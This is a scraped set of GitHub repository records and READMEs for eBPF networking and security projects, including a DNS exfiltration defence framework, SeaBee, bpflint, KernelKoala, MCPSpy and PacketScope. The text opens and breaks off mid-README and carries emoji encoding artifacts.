* Enhanced protection for in-build scan and prevention over kernel encapsulation mecahnicsms (VLAN, Tun/Tap, VXLAN).
* Hardened Security using seccomp, LSM, BPF secured map pinning, and BPF map lockings to protect all eBPF maps inside Linux kernel. 
* Build to prevent DGA (Domain generation algorithms), metrics with prometheus, grafana and practively adoptable for massively scaled infrastructures.
* Support to integrate itself with any XDR / EDR solutions providie metrics for centralized enterprise monitoring tools.
* Modular design to integrate across several legacy and modern cloud-native DNS topologies.
* Robust adaptable to modern evolving threats and massively scalable for enterprise data planes, with Kafka threat events updating malicious domain cache in userspace across and security policies inside kernel across each node in data plane.

## Features In Development
* Rate Limiting
    * Malicious / Suspicious Requests per second window
        Implementation of Token Bucket Algorithm for rate-limiting DNS traffic over kernel TC egress QDISC (bpf_timer), with refill rate equals 1 sec kernel time-window per-cpu reference pinned reference per CPU.
    * Improve the DNS Volume base rate limiting
* Zero Trust Architecture with Dual Signatures and Mutual Authentication for eBPF programs loading in cloud distributed systems
	* Stage 1: Control Plane â†” Data Plane
	* gRPC over mutual TLS (mTLS) used for secure communication,
	* Control plane signs eBPF programs, verified by the data plane during load.
	* Stage 2: Node â†” Kernel
	* Kernel Keyring + BPF LSM hooks enforce signature verification of eBPF ELF programs,
	* Mirrors TLS certificate revocation logic over kernel process keyrings, supporting internal and parent Certificate Authorities for continuous validation and attestation.

## Future Plans 
* Cloud Providers Infrastructure Integration 
    * Integration with Public Cloud providers for dynamic NACL, Security groups, firewall rules creation over VPC for DNS exfiltration security
eBPF node agent rinning over host ns, to fully thwart data breach by killing malicious C2 implants.
* Enhance security covering all attack vectors for DNS data exfiltration over TCP (as covered in UDP) at endpoint itself, supporting conntrack state mapping in eBPF map for TCP handshake prior DNS transfer and stopping DNS data transfer over TCP socket via kernel TC.
    1.  Integrate  L7 TCP sock listener over user-space for coalesced tcp segments, for kernel to live forward TCP traffic from host netdev TC to envoy l7 socket listneer.
    2.  Implement a envoy GO wasm filter for deep parsing DNS traffic over TCP over unix stream socket and shared as component of core node-agent with similar hunt for process encap in kernel and userspace endpoint agent.
* Harden security integrating with KubeArmor and other ACL policies for hardened security in orchestrated environments.
* Enhance framework for safeguarding enterprises from exfiltration over other protocols (ICMP, FTP) etc. 
* Enhance support for DOT (DNS over TLS), eBPF based TLS fingerprinting interception in kernel. 
* Add support for XDP ingress NXDOMAIN flood prevention to break DNS woter torture flood attacks. 

## Building 

### Data Plane (eBPF Node Agent)
```
    bash infrastructure/agent.sh
    make build 
    make run_node_agent
```
### Control Plane 
```
    bash infrastructure/controller.sh 
    make build-controller
```

## Dependencies
* Data Plane (eBPF Node Agent): ``` infrastructure/agent.sh ```
* Control Plane: ``` infrastructure/controller.sh ```

## WhitePaper and supporting Paper
* [Security Framewok WhitePaper](https://github.com/Synarcs/DNSObelisk_Report) provides detailed internals of the security framework (the whitepaper is in process to be formelly published at upcoming USENIX Security, ACM and other security conferences).

## Author
- [Vedang Parasnis (Synarcs)](https://github.com/Synarcs/)

## Conferences
* Accepted and was presented at [Netdev 0x19](https://netdevconf.info/0x19/sessions/bof/real-time-prevention-of-dns-based-data-exfiltration-bof.html) for innovation in Linux kernel advancing DNS security.
* Accepted and was presented at [Linux Security Summit](https://sched.co/1zamI) for innovation in Linux kernel intersecting Kernel datapath, LSM, kprobes, tracepoints for advanced endpoint security solutions.
* Accepted at [Black Hat Breifings](https://www.blackhat.com/us-25/briefings/schedule/#kernel-enforced-dns-exfiltration-security-framework-built-for-cloud-environments-to-stop-data-breaches-via-dns-at-scale-45566) with honororium for groundbreaking research termed as kernel enforced endpoint security built specifically to enhance DNS security to nuetralize emerging C2 attack vectors scalable in distribtued environments with strength combat evolving C2 infrastructure attacks.

## Disclaimer
* This project is under heavy development focusing on a longer vision (Kernel enforced dynamic  security for detection and response) a privileged wrapper aiding EDR / XDR solutions, hence expect some bugs around it ðŸ˜€ðŸ˜€ðŸ˜€
* This project has no affiliation to any research group at University of Washington, neither with any professors, with research, architecture design, implementation done solely without guidance as an independent researcher.

## Support 
<a href=""https://www.buymeacoffee.com/vedangparan"" target=""_blank""><img src=""https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png"" alt=""Buy Me A Coffee"" style=""height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"" ></a>


"
NationalSecurityAgency/seabee,43,6,43,17,Rust,Hardens eBPF tools against privileged attackers via policy-based access controls,2025-06-03T13:22:58Z,2025-10-03T19:46:58Z,46,"# SeaBee

SeaBee is a stylized acronym for ""Security Enhanced Architecture for eBPF"".

SeaBee is a framework for hardening other eBPF security tools against intervention by
privileged users. For example, eBPF maps can be written to by any privileged user which
might make it easy to disrupt security policy or configuration of an eBPF security tool.
SeaBee allows an administrator to enforce policies controlling who has access to eBPF
tools on a system based on private keys. This makes it harder for an attacker to compromise
or subvert security controls implemented in eBPF.

For an overview, see our [presentation about SeaBee](https://www.youtube.com/watch?v=4bWpTKK7Mlw) at the [2025 Linux Security Summit NA](https://events.linuxfoundation.org/linux-security-summit-north-america/)

See our guide to [Getting Started with SeaBee](./docs/docs/getting_started.md)

Then try our [tutorial](./docs/docs/tutorial.md)

Don't hesidate to create an issue or a PR! See [CONTRIBUTING.md](./CONTRIBUTING.md)

Warning: this project is still under active development, it is not yet ready for production use.

## Documentation

Documentation is found under `docs/docs/`

* To build the documentation:
  * Reload the shell `source ~/.bashrc`
  * `make docs` and then `make -C docs build`
* To view the documentation in a browser: `make -C docs serve-build`

## Disclaimer of Endorsement

Nothing in this Work is intended to constitute an endorsement, explicit or implied,
by the United States Government of any particular manufacturer's product or service.

Any reference made herein by the United States Government to any specific commercial
product, process, or service by trade name, trademark, manufacturer, or otherwise,
in this Work does not constitute an endorsement, recommendation, or favoring by the
United States Government and shall not be construed as a reference for advertising
or product endorsement purposes.
"
isovalent/cilium-up-and-running,59,10,59,0,Shell,"This repository contains manifests, scripts, and configurations referenced in the O'Reilly book Cilium Up and Running. These resources are intended to help readers experiment with Cilium features, reproduce demonstrations, and deepen their understanding of Kubernetes networking, security, and observability.",2025-03-10T14:30:46Z,2025-10-12T06:41:17Z,48,"# Cilium Up and Running

This repository contains manifests, scripts, and configurations referenced in the O'Reilly book **_Cilium Up and Running_**. These resources are intended to help readers experiment with Cilium features, reproduce demonstrations, and deepen their understanding of Kubernetes networking, security, and observability.

> _Note: This repository is intended as a companion to the book. It is not a production-ready deployment._

## Contents

- Example Kubernetes manifests for installing and configuring Cilium
- Helm values and installation snippets
- Sample YAMLs for network policies, services, and routing scenarios
- Supporting scripts and troubleshooting utilities

Each subdirectory corresponds to a book chapter or concept and may contain its own `README.md` for instructions or explanations.

## Getting Started

To get started:

```bash
git clone https://github.com/isovalent/cilium-up-and-running.git
cd cilium-up-and-running
```

You can then browse the files and follow the instructions provided within each folder.

## License

This repository is licensed under the [MIT License](./LICENSE). See the [LICENSE](./LICENSE) file for details.

## Contributing

This repository is a companion to the book. If you find corrections and improvements for these examples, we welcome your suggestions via issues and PRs!

For general information on contributing to Cisco Open Source projects, please refer to the [Cisco Open Source CONTRIBUTING guide](https://github.com/cisco-open/oss-template/blob/main/CONTRIBUTING.md).

## Copyright

Copyright (c) 2025 Cisco Systems, Inc. and its affiliates.
"
d-e-s-o/bpflint,14,5,14,9,Rust,Linting functionality for BPF C programs. Web UI @ https://d-e-s-o.github.io/bpflint/,2025-06-12T23:08:08Z,2025-10-11T21:03:03Z,124,"[![pipeline](https://github.com/d-e-s-o/bpflint/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/d-e-s-o/bpflint/actions/workflows/test.yml)
[![crates.io](https://img.shields.io/crates/v/bpflint.svg)](https://crates.io/crates/bpflint)
[![Docs](https://docs.rs/bpflint/badge.svg)](https://docs.rs/bpflint)

bpflint <img src=""var/logo.png"" style=""height:1em"">
=======

- [Library documentation][docs-rs]
- [Library changelog](CHANGELOG.md)

Linting functionality for BPF C kernel programs. The Linux kernel's BPF
sub-system is continuously being improved and certain patterns
recommended in the past may no longer be state-of-the-art today.
Similarly, some ""foot guns"" exist that by definition may not be obvious
to new comers.

**bpflint** contains a linter for BPF C kernel programs that accepts
such a `.bpf.c` file as input and scans it for such known issues,
pointing them out and providing recommendations on how to fix them.

Provided is a Rust library, a [command line interface](cli/), a [Web
UI][web-ui], as well as a [GitHub Action][gh-action] for linting of BPF
C programs.

### ðŸ“š Frequently Asked Questions (FAQ)

#### â“ **Q: I am interested in helping out. How can I get started?**
**A:** We have a list of [issues](https://github.com/d-e-s-o/bpflint/issues)
       with ideas for contributions, which mark a good starting point.
       For documentation on lints specifically and how to add a new one,
       please check out the [lints/](lints/) sub-directory. All other
       questions are probably best asked in one of the existing issues
       (or a new one).

#### â“ **Q: I have a repository with BPF code, can I lint contributions easily?**
**A:** If you are using GitHub Actions as the continuous integration
       solution of choice, you can add a separate job using the
       [`lint-bpf` Action][gh-action].
       For other CI systems some manual plumbing will be necessary. We
       provide statically linked `bpflinter` CLI binaries that can be
       downloaded from each `cli-vX.Y.Z` release and used directly on
       any Linux. E.g.,
       https://github.com/d-e-s-o/bpflint/releases/download/cli-v0.1.2/bpflinter-x86_64-unknown-linux-musl

#### â“ **Q: I got a false-positive, what can I do?**
**A:** Some lints require context that is not possible or feasible for
       the linter to acquire. E.g., `kprobe` attach point usage may be
       flagged as being an unstable attach point, but the linter cannot
       know whether a better alternative, say, in the form of a
       tracepoint, exists. **bpflint** recognizes C comments of the
       following form on blocks and statements:
       ```
       /* bpflint: disable=<lint-name> */
       ```
       When encountered, the named lint will be disabled for the
       directly following item (block, statement, ...).

[docs-rs]: https://docs.rs/bpflint/latest
[gh-action]: https://github.com/d-e-s-o/lint-bpf
[web-ui]: https://d-e-s-o.github.io/bpflint/
"
madhavan-21/kernalKoala,26,1,26,1,C,This project is a minimal eBPF-based Layer 4 (Transport Layer) network monitor that uses tc (Traffic Control) hooks to trace ingress and egress network traffic in real time. ,2025-06-13T17:12:43Z,2025-08-26T10:11:15Z,33,"***ðŸ¨ðŸ“¦ KernelKoala - eBPF Network Traffic Capture Tool ðŸ”¬ðŸ***

![Custom Image](/config/assest/kernalkoala.png)


A high-performance network traffic analyzer built with eBPF in Go. It supports TCP/UDP/ICMP packet monitoring with optional DNS resolution, multi-interface support, and per-interface statistics via tc (Traffic Control) hooks.

ðŸ“¦ Features

 **ðŸ§  eBPF programs for ingress and egress traffic**

 **ðŸš€ High-performance packet capture via perf ring buffer**

 **ðŸ§µ Worker pool architecture with batching**

 **ðŸŒ Optional DNS resolution with caching**

 **ðŸ”„ Supports multiple interfaces via config**

 **ðŸ“Š Live statistics (processed/dropped/queue full)**

 **ðŸ›‘ Graceful shutdown handling via signals**

 **ðŸ§© Extensible and modular design**

ðŸ”§ Requirements

  *Linux Kernel â‰¥ 5.4 (with eBPF and tc support)*
  *Go â‰¥ 1.20*
  *Dependencies managed in go.mod*
```
    github.com/cilium/ebpf v0.12.3
    github.com/vishvananda/netlink v1.1.0
    github.com/miekg/dns v1.1.55
    golang.org/x/sys v0.13.0
```

ðŸš€ Quick Run

Follow these steps to quickly set up, build, and run kernelkoala:

***1. ðŸ“¥ Install Dependencies***
Install Go and eBPF build tools (via scripts/install.sh):

```bash
make install
```

***2. ðŸ§ª Run Tests and Build Everything (Go + eBPF)***

```bash
make
```

***3. ðŸš€ Run the App***
Run the app on the loopback interface (lo) by default:

```bash
make run
```

Or specify a different interface (e.g., eth0):

```bash
IFACE=eth0 make run
```

***4. ðŸ—ï¸ Build Production Binaries (All Architectures)***
```bash
make prod
```

***5. ðŸ§¹ Clean All Builds***
```bash
make clean
```

***Note: All binaries will be placed under the bin/ directory.***



ðŸ› ï¸ Build Instructions

***1. Build the eBPF Object***

```bash
cd bpf/network
make
# This should output tc-x86_64.o (or aarch64/riscv64 depending on arch)
```
Note: Ensure your kernel headers and LLVM/Clang are installed for eBPF compilation.

***2. Build the Go Application***
```bash
go build -o kernelKoala ./cmd/kernelKoala
```

ðŸš€ Run the Application

***Basic Usage***

```
sudo ./kernelKoala --iface eth0 --dns=true
```

***Environment-based***

```
export IFACE=eth0
export LOOPBACK=false
sudo ./kernelKoala
```

***âš™ï¸ CLI Flags & Environment Variables***

```table
| Flag/Env                  | Description                            | Default                 |
| ------------------------- | -------------------------------------- | ----------------------- |
| `--iface` / `IFACE`       | Network interface to monitor           | `lo`                    |
| `--loopback` / `LOOPBACK` | Drop loopback traffic (`true`/`false`) | `true`                  |
| `--workers`               | Number of worker goroutines            | `NumCPU`                |
| `--buffer`                | Event channel buffer size              | `100000`                |
| `--batch`                 | Batch size per worker                  | `100`                   |
| `--dns`                   | Enable DNS resolution                  | `false`                 |
| `--dns-timeout`           | Timeout per DNS query                  | `500ms`                 |
| `--dns-cache-size`        | Max DNS cache entries                  | `10000`                 |
| `--dns-cache-ttl`         | TTL per DNS cache entry                | `5m`                    |
| `--dns-servers`           | DNS servers to use (comma-separated)   | `8.8.8.8:53,1.1.1.1:53` |
```

ðŸ“¦ Output Example

```bash
Ingress TCP: src=192.168.1.10(myhost.com):443 -> dst=192.168.1.5(:-):53820 | flags=0x10([ACK]) | iface=eth0
Egress UDP: src=192.168.1.5(:-):56000 -> dst=8.8.8.8(dns.google):53 | flags=NONE | iface=eth0
```

ðŸ“Š Stats

```bash
Every 10 seconds, logs:

```bash
Stats - Processed: 15000, Dropped: 0, Queue Full: 0
```

ðŸ§¼ Graceful Shutdown

```bash
Handles SIGINT and SIGTERM, stops all goroutines, cleans up tc filters, and closes perf readers.

```

ðŸ“‚ Project Structure

```bash
cmd/kernelKoala/main.go         # Entry point
internal/network/               # Capture logic, DNS resolver, workers
bpf/network/                    # eBPF program (.c and .o files)
internal/logger/                # Logger wrapper (assumed custom)
```

ðŸ§ª Testing

Use test environments like minikube, Docker, or local interfaces:

```bash
curl google.com
ping 1.1.1.1
dig google.com
```

To trigger traffic and see real-time capture.

ðŸ“Œ Notes

***Requires root privileges to attach eBPF programs to interfaces.***
***Ensure ulimit -l is sufficient for memlock (auto raised in code).***
***Use ethtool, ip a, or ifconfig to find valid interfaces.***

ðŸ§  Inspired by

```bash
Cilium

BCC Tools (tcplife, tcptop)

Netshoot

```

ðŸ§‘â€ðŸ’» Author
 
***Maintained by Madhavan S.***


***ðŸ’¬ For questions, feel free to ask here.***

"
alex-ilgayev/MCPSpy,455,64,455,8,C,MCP Monitoring with eBPF,2025-07-17T15:47:17Z,2025-10-12T16:49:51Z,48,"# MCPSpy - MCP Monitoring with eBPF ðŸ•µï¸âœ¨

[![CI](https://github.com/alex-ilgayev/mcpspy/actions/workflows/ci.yml/badge.svg)](https://github.com/alex-ilgayev/mcpspy/actions/workflows/ci.yml)
[![Go Version](https://img.shields.io/badge/go-1.24+-blue.svg)](https://golang.org)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)

<div align=""center"">
<pre>
â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—
â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•
â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• 
â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â• â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•   â•šâ–ˆâ–ˆâ•”â•  
â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘   
â•šâ•â•     â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•     â•šâ•â•â•â•â•â•â•â•šâ•â•        â•šâ•â•   
</pre>
<b>MCPSpy - Real-time monitoring for Model Context Protocol communication using eBPF</b>
</div>

## Overview

MCPSpy is a powerful command-line tool that leverages [eBPF (Extended Berkeley Packet Filter)](https://ebpf.io/) technology to monitor [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) communication at the kernel level. It provides real-time visibility into JSON-RPC 2.0 messages exchanged between MCP clients and servers by hooking into low-level system calls.

The Model Context Protocol supports three transport protocols for communication:

- **Stdio**: Communication over standard input/output streams
- **Streamable HTTP**: Direct HTTP request/response communication with server-sent events
- **SSE (Server-Sent Events)**: HTTP-based streaming communication (_Deprecated_)

**MCPSpy supports monitoring of both Stdio and HTTP/HTTPS transports** (including Server-Sent Events), providing comprehensive coverage of MCP communication channels.

![demo](./assets/demo.gif)

## Why MCPSpy?

The Model Context Protocol is becoming the standard for AI tool integration, but understanding what's happening under the hood can be challenging. MCPSpy addresses this by providing:

- **ðŸ”’ Security Analysis**: Monitor what data is being transmitted, detect PII leakage, and audit tool executions
- **ðŸ› Debugging**: Troubleshoot MCP integrations by seeing the actual message flow
- **ðŸ“Š Performance Monitoring**: Track message patterns and identify bottlenecks
- **ðŸ” Compliance**: Ensure MCP communications meet regulatory requirements
- **ðŸŽ“ Learning**: Understand how MCP works by observing real communications

## Installation

### Prerequisites

- Linux kernel version 5.15 or later
- Root privileges (required for eBPF)

### Download Pre-built Binary (Auto-detect OS + Arch)

Download the latest release from the [release page](https://github.com/alex-ilgayev/mcpspy/releases):

```bash
# Set platform-aware binary name
BIN=""mcpspy-$(uname -s | tr '[:upper:]' '[:lower:]')-$(uname -m | sed -e 's/x86_64/amd64/' -e 's/aarch64/arm64/')""

# Download the correct binary
wget ""https://github.com/alex-ilgayev/mcpspy/releases/latest/download/${BIN}""

# Make it executable and move to a directory in your PATH
chmod +x ""${BIN}""
sudo mv ""${BIN}"" /usr/local/bin/mcpspy
```

> âœ… Note: Currently supported platforms: linux-amd64, linux-arm64

### Build from Source

#### Install Dependencies

First, install the required system dependencies:

```bash
sudo apt-get update
# Install build essentials, eBPF dependencies
sudo apt-get install -y clang clang-format llvm make libbpf-dev build-essential
# Install Python 3 and pip (for e2e tests)
sudo apt-get install -y python3 python3-pip python3-venv
# Install docker and buildx (if not already installed)
sudo apt-get install -y docker.io docker-buildx
```

#### Install Go

MCPSpy requires Go 1.24 or later. Install Go using one of these methods:

Option 1: Install from the official Go website (Recommended)

```bash
# Download and install Go 1.24.1 (adjust version as needed)
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz

# Add Go to PATH (add this to your ~/.bashrc or ~/.profile for persistence)
export PATH=$PATH:/usr/local/go/bin
```

Option 2: Install via snap

```bash
sudo snap install go --classic
```

#### Build MCPSpy

Clone the repository and build MCPSpy:

```bash
# Clone the repository
git clone https://github.com/alex-ilgayev/mcpspy.git
cd mcpspy

# Build the project
make all
```

### Docker

```bash
# Build Docker image
make image
# Or pull the latest image
docker pull ghcr.io/alex-ilgayev/mcpspy:latest
# Or pull a specific image release
docker pull ghcr.io/alex-ilgayev/mcpspy:v0.1.0

# Run the container
docker run --rm -it --privileged ghcr.io/alex-ilgayev/mcpspy:latest
```

### Kubernetes

MCPSpy can be deployed in Kubernetes clusters to monitor MCP traffic from AI/LLM services like LangFlow, LangGraph, and other applications that use the Model Context Protocol.

```bash
# Deploy MCPSpy as a DaemonSet
kubectl apply -f https://raw.githubusercontent.com/alex-ilgayev/mcpspy/main/deploy/kubernetes/mcpspy.yaml
```

#### Real-World Use Cases in Kubernetes

1. **Monitoring LangFlow/LangGraph Deployments**

   - Observe MCP traffic between LangFlow/LangGraph and AI services
   - Debug integration issues in complex AI workflows
   - Audit AI interactions for security and compliance

2. **AI Service Monitoring**

   - Track interactions with both remote and local MCP servers
   - Identify performance bottlenecks in AI service calls
   - Detect potential data leakage in AI communications

3. **Development and Testing**
   - Test MCP implementations in containerized environments
   - Validate AI service integrations before production deployment
   - Ensure consistent behavior across different environments

For detailed instructions and real-world examples of monitoring AI services in Kubernetes, see the [Kubernetes Usage Guide](docs/kubernetes-usage.md).

## Usage

### Basic Usage

```bash
# Start monitoring MCP communication
sudo mcpspy

# Start monitoring with raw message buffers
sudo mcpspy -b

# Start monitoring and save output to JSONL file
sudo mcpspy -o output.jsonl

# Stop monitoring with Ctrl+C
```

### Output Format

#### Console Output

```

12:34:56.789 python[12345] â†’ python[12346] REQ tools/call (get_weather) Execute a tool
12:34:56.890 python[12346] â†’ python[12345] RESP OK

```

#### JSONL Output

```json
{
  ""timestamp"": ""2024-01-15T12:34:56.789Z"",
  ""transport_type"": ""stdio"",
  ""stdio_transport"": {
    ""from_pid"": 12345,
    ""from_comm"": ""python"",
    ""to_pid"": 12346,
    ""to_comm"": ""python""
  },
  ""type"": ""request"",
  ""id"": 7,
  ""method"": ""tools/call"",
  ""params"": {
    ""name"": ""get_weather"",
    ""arguments"": { ""city"": ""New York"" }
  },
  ""raw"": ""{...}""
}
```

For HTTP/HTTPS transport:

```json
{
  ""timestamp"": ""2024-01-15T12:34:56.789Z"",
  ""transport_type"": ""http"",
  ""type"": ""request"",
  ""id"": 7,
  ""method"": ""tools/call"",
  ""params"": {
    ""name"": ""get_weather"",
    ""arguments"": { ""city"": ""New York"" }
  },
  ""raw"": ""{...}""
}
```

## Architecture

MCPSpy uses an event-driven architecture with a publish-subscribe pattern to decouple components and enable extensibility. The system consists of several components that communicate through a central event bus:

### 1. Event Bus (`pkg/bus/`)

- Central communication hub using publish-subscribe pattern
- Enables asynchronous event processing
- Using `github.com/asaskevich/EventBus` library

### 2. eBPF Program (`bpf/`)

- Hooks into `vfs_read` and `vfs_write` kernel functions for stdio transport
- Hooks into TLS library functions (`SSL_read`, `SSL_write`) for HTTP/HTTPS transport
- Filters potential MCP traffic by detecting JSON patterns
- Sends events to userspace via ring buffer
- Minimal performance impact with early filtering

### 3. eBPF Loader (`pkg/ebpf/`)

- Manages the lifecycle of eBPF programs and resources
- Loads pre-compiled eBPF objects into the kernel using cilium/ebpf library
- Converts raw binary events from kernel space into structured Go data types
- Publishes events to the event bus for downstream processing

### 4. HTTP Session Manager (`pkg/http/`)

- Subscribes to TLS-related events from the event bus
- Manages HTTP/HTTPS sessions and correlates request/response pairs
- Handles TLS payload interception and parsing
- Supports chunked transfer encoding and Server-Sent Events (SSE)
- Reconstructs complete HTTP messages from fragmented TLS data
- Publishes reconstructed HTTP bodies to the event bus for MCP parsing

### 5. MCP Protocol Parser (`pkg/mcp/`)

- Subscribes to data events from the event bus (stdio and HTTP TLS payloads)
- Validates JSON-RPC 2.0 message format
- Parses MCP-specific methods and parameters
- Correlates read operations and write operations into a single MCP message (relevant for stdio transport)
- Supports both stdio and HTTP/HTTPS transports (including SSE)
- Publishes parsed MCP messages to the event bus

### 6. Output Handlers (`pkg/output/`)

- Subscribe to MCP message events from the event bus
- Console display with colored, formatted output
- JSONL output for programmatic analysis
- Real-time statistics tracking

### 7. Event Logger (`pkg/eventlogger/`)

- Subscribes to all events on the event bus for debugging
- Provides detailed logging of event flow through the system
- Configurable log levels for different event types

## Development

### Building

```bash
# Generate eBPF bindings and build
make all

# Build Docker image
make image
```

### Testing

MCPSpy includes comprehensive end-to-end tests that simulate real MCP communication across different transports:

```bash
# (Optional) Set up test environment
make test-e2e-setup

# Run all tests (requires root privileges)
make test-e2e

# Run individual transport tests
make test-e2e-stdio   # Test stdio transport
make test-e2e-https   # Test HTTP/HTTPS transport
```

The test suite includes:

- MCP server and client simulators for both stdio and HTTP transports
- Message validation against expected outputs
- Multiple message type coverage
- SSL/TLS encrypted HTTP communication testing

## Limitations

- **FS Events Buffer Size**: Limited to 16KB per message. This means MCP messages with **buffer size** greater than 16KB will be missed / ignored.
- **FS Events Constructed of Multiple Messages**: MCPSpy currently does not support reconstructing MCP messages that are split across multiple `read` or `write` syscalls. This means that if an MCP message is larger than the buffer size used in a single syscall, it may be missed or ignored.
- **Inode Collision for Stdio Transport**: Inode numbers are only unique within a filesystem. If monitoring processes across multiple filesystems or mount namespaces, inode collisions are theoretically possible but rare in practice for pipe-based stdio communication.
- **Platform**: Linux only (kernel 5.15+).

## Contributing

We welcome contributions! Feel free to open an issue or a pull request.

## License

- **User-mode code** (Mainly Go): Apache 2.0 (see [LICENSE](LICENSE))
- **eBPF C programs** (`bpf/*`): GPL-2.0-only (see [LICENSE-BPF](LICENSE-BPF))

---

<div align=""center"">
Made with â¤ï¸ by Alex Ilgayev
</div>
"
Internet-Architecture-and-Security/PacketScope,387,26,387,3,C,ðŸŽ¯ A general-purpose protocol stack analysis and debugging tool based on eBPF ðŸ§°,2025-07-11T09:31:42Z,2025-10-11T12:54:14Z,48,"<div align=""center"">
  <img src=""./.github/resource/newlogo.png"" alt=""packetscope-logo"" width=""150"">
</div>

<p align=""center""><a href=""./README-zh_CN.md"">ä¸­æ–‡</a> Â· English</p>

<div align=""center"">
  <img alt=""GitHub Release"" src=""https://img.shields.io/github/v/release/Internet-Architecture-and-Security/PacketScope"">
  <img alt=""GitHub License"" src=""https://img.shields.io/github/license/Internet-Architecture-and-Security/PacketScope"">
</div>

# PacketScope: ""Smart Armor"" for Server-Side Defense

**PacketScope** is a general-purpose protocol stack analysis and debugging tool based on eBPF. It integrates performance optimization, anomaly diagnosis, and security defense. It aims to implement fine-grained tracing and intelligent analysis of network packets at the protocol stack level on the server side. By solving three major pain pointsâ€”difficult diagnosis of performance bottlenecks, unclear transmission paths, and hard-to-detect low-level attacksâ€”PacketScope provides visualized, intelligent endpoint-side security analysis and defense capabilities.

![packetscope](./docs/home_en.png)
![packetscope](./docs/home_en_light.png)

## Background

With the proliferation of social platforms, online banking, large-scale AI models, logistics, and travel services, open servers have become key execution environments. These must balance performance and security under the condition of being openly accessible. Traditional WAFs and IDS tools have blind spots in protocol stack-level defense, which PacketScope addresses:

> **ðŸš¨ Three Core Pain Points:**
>
> 1. Unclear packet paths through the protocol stack make bottlenecks and faults hard to diagnose
> 2. Lack of fine-grained cross-domain transmission data makes routing risks invisible
> 3. Low-level protocol stack attacks are stealthy and difficult to detect with traditional tools

Through protocol tracing, path visualization, and intelligent analysis, PacketScope builds ""smart armor"" for the server.

## ðŸš€ Core Capabilities

- ðŸ§  **Intelligent Engine**: Combines eBPF with LLMs for low-level network behavior observation and intelligent security defense
- ðŸ“Š **Multidimensional Analysis**: Real-time tracking of network paths, statistics on latency, packet loss, interaction frequency
- ðŸŒ **Global Network Visualization**: Maps global paths and latency, presented on a topology graph
- ðŸ” **Protocol Stack Defense**: Detects and intercepts low-level abnormal traffic, covering the blind spots of traditional WAF/IDS
- ðŸ–¥ï¸ **User-Friendly Interface**: GUI designed for easy use by security engineers and operators

## âš¡ Getting Started

### Prerequisites

Before starting, ensure Docker is installed and running on your system:

- **Docker**: Version 20.10 or higher
- **Docker Compose**: Version 2.0 or higher

To verify your Docker installation:

```bash
docker --version
docker compose version
```

If Docker is not installed, please visit [Docker's official website](https://docs.docker.com/get-docker/) for installation instructions.

### One-Click Deployment

PacketScope provides a convenient deployment script that automatically builds and starts all services using Docker Compose.

#### 1. Clone the Repository

```bash
git clone https://github.com/Internet-Architecture-and-Security/PacketScope.git
cd PacketScope
```

#### 2. Run the Deployment Script

Execute the starter script with root privileges:

```bash
sudo bash starter.sh
```

The script will automatically:
- Check your Docker environment
- Stop any existing services
- Build all service containers in the correct order
- Start all services
- Display service status and access information

#### 3. Access the Application

Once deployment is complete, open your browser and visit:

```
http://localhost:4173/
```

### Service Endpoints

After successful deployment, the following services will be available:

- **Web UI**: `http://localhost:4173`
- **Guarder API**: `http://localhost:8080`
- **Tracer API**: `http://localhost:8000`
- **Analyzer-Monitor API**: `http://localhost:8010`
- **Analyzer-Calculator API**: `http://localhost:8020`

### Managing Services

**View service status:**
```bash
sudo docker compose ps
```

**View service logs:**
```bash
sudo docker compose logs -f
```

**View logs for a specific service:**
```bash
sudo docker compose logs -f <service-name>
```

**Stop all services:**
```bash
sudo docker compose down
```

**Restart services:**
```bash
sudo docker compose restart
```

**Restart a specific service:**
```bash
sudo docker compose restart <service-name>
```

> ðŸ’¡ **Note**: The starter.sh script handles the entire deployment process automatically. For manual deployment or advanced configuration, please refer to the individual module README files in the `modules/` directory.



## ðŸ“ Project Structure

```
.
â”œâ”€â”€ CODE_OF_CONDUCT.md          # Code of Conduct
â”œâ”€â”€ CONTRIBUTING.md             # Contributing Guidelines
â”œâ”€â”€ docker-compose.yml          # Docker Compose configuration
